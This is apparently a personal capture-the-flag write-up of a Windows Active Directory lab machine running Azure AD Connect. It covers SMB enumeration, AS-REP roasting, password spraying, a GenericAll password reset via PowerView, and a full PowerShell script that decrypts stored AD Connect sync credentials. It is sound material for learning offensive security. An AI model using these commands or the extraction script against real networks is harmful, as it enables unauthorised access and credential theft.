---
Status: Done
OS: Windows AD
Difficulty: Medium
tags:
  - azureAD
  - SMB
Date: 2026-07-05T16:53:00
Owned: 2026-07-06T01:27:00
---

---
# Enumeration
## port scan
result from rustscan  
![[Pasted image 20260705165857.png]]

## SMB
checked anonymous ,null session -- access denied, log on failure  
however we can list users with --users  
```sh
nxc smb 10.129.228.111 -u '' -p '' --users-export smbusers.txt
```
![[Pasted image 20260705170515.png]]
guest account disabled  
![[Pasted image 20260705171440.png]]

## Asrep

since we have userlist  
```sh
nxc ldap 10.129.228.111 -u smbusers.txt -p '' --asreproast asrep.hashes
```
![[Pasted image 20260705171255.png]]
## spraying smb
tried smbusers.txt with blank  
tried smbusers.txt with P@ssw0rd  

check password policy  
![[Pasted image 20260705172002.png]]

no Lockout Threshold, we can keep spraying  
let's try using username as password  
```sh
nxc smb 10.129.228.111 -u smbusers.txt -p smbusers.txt --continue-on-success --no-bruteforce
```
found one cred valid  
![[Pasted image 20260705172734.png]]
SABatchJobs:SABatchJobs  
check service we can use creds on  
![[Pasted image 20260705173140.png]]
list the shares  
![[Pasted image 20260705173233.png]]
got some interesting shares, especially azure_uploads  
turnout I was wrong, the azure_uploads were blank  
but there is something in users$  
![[Pasted image 20260705173536.png]]
plaintext password in the file probably for user `mhope`  
![[Pasted image 20260705173615.png]]
we have remote access!  
![[Pasted image 20260705173753.png]]

# mhope

![[Pasted image 20260705173937.png]]
get the user flag  
![[Pasted image 20260705174011.png]]


# Priv esc
![[Pasted image 20260705174136.png]]
priv  
![[Pasted image 20260705174220.png]]
file access  
![[Pasted image 20260705174421.png]]
can't access NTDS folder  
there is .Azure in mhope's directory  
![[Pasted image 20260705212829.png]]
just a note don't know if i can use it  
token for john clark  
![[Pasted image 20260705214751.png]]

IDK running winpeas

sqlserver 1433
![[Pasted image 20260705221624.png]]

![[Pasted image 20260705221730.png]]

GenericAlkl? -> care full check the user or group the group we have as mhope isn't in the GenericAll listed here  
![[Pasted image 20260705221941.png]]

abuse generic all to change admin password  
tried nxc  
```sh
nxc smb 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$' -M change-password -o USER=Administrator NEWPASS=P@ssw0rd123
```
![[Pasted image 20260705222848.png]]
use powerview  
```powershell
#to Create a PSCredential object 
$SecPassword = ConvertTo-SecureString '4n0therD4y@n0th3r$' -AsPlainText -Force 
$Cred = New-Object System.Management.Automation.PSCredential('megabank.local/mhope', $SecPassword) 
#to Create a SecureString Object 
$adminPassword = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force #change admin Password 
cd C:\Tools\ 
Import-Module .\PowerView.ps1 
Set-DomainUserPassword -Identity damundsen -AccountPassword $adminPassword -Credential $Cred -Verbose 
```
![[Pasted image 20260705223117.png]]


## bloodhound
collection
```sh
nxc ldap 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$' --bloodhound --collection All --dns-server 10.129.228.111
```
upload to bloodhound  
query shortest path from owned object  
![[Pasted image 20260705232648.png]]

## Azure AD Sync

Because of how Microsoft designed older versions of Azure AD Connect, the password for the local **administrator** account is stored encrypted in a local database—but the sync service has the keys to decrypt it.

Idk stuck here, after checking the guided mode it has something to do with Azure group  
I think maybe use azure token we found  
https://blog.xpnsec.com/azuread-connect-for-redteam/
there is a script provided for poc which will use sqlservice \ADSync  
then get the credential for us  
at first I upload the script then run on our target  
![[Pasted image 20260706003402.png]]
turn out we need to edit the source first  
as in the blog  
![[Pasted image 20260706003425.png]]
I guess we gonna use this one  
![[Pasted image 20260706003729.png]]
`C:\Program Files\Microsoft SQL Server\110\Tools\Binn\SQLCMD.EXE`
![[Pasted image 20260706003323.png]]
edited  
![[Pasted image 20260706003900.png]]

gave up  
looking thorough the write up it shows that we can't just run code as is  

running Get-Process , and attempting to run tasklist results in an Access Denied error. We can also try to enumerate services with the PowerShell cmdlet Get-Service , or by invoking wmic.exe service get name , sc.exe query state= all or net.exe start , but are also denied access. Instead, we can enumerate the service instance using the Registry 
```powershell
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```

![[Pasted image 20260706011439.png]]
C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe  

Get Azure AD sync version, there is many variation since microsoft change the way it work in 2020  
```powershell
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force
```


the solution require us to manually use sqlcmd to manually get the instance_id and entropy  

```
sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from
mms_server_configuration"
```
![[Pasted image 20260706011358.png]]

edit the script input our instace,entropy and the service path  
![[Pasted image 20260706012124.png]]
even after I edit this much I still miss something when executing the script  
Imma just paste the final script from writeup here  
```powershell
Function Get-ADConnectPassword{

Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$key_id = 1
$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList
"Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"

$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM
mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName
Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']"
| select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']"
| select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name =
'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
}
```
Tips we can use evil-winrm -s to load our script folder into the session so we dont need to upload file.  
```sh
evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$' -s .
```

execute  
```
azure_decrypt_msol.ps1
Get-ADConnectPassword
```
![[Pasted image 20260706012542.png]]
this is what it should look like  
![[Pasted image 20260706012610.png]]
imma just skip those tidius part and connect with cred from writeup  
![[Pasted image 20260706012717.png]]
boom  
![[Pasted image 20260706012752.png]]
